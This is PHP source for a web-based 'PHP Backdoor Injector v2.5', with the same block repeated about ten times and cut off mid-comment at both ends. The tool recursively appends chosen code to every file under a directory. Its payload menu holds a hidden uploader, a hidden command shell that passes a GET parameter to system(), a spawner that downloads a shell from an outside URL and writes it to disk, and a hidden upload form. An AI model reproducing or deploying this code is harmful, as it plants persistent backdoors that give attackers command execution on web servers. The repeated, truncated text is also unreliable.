    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
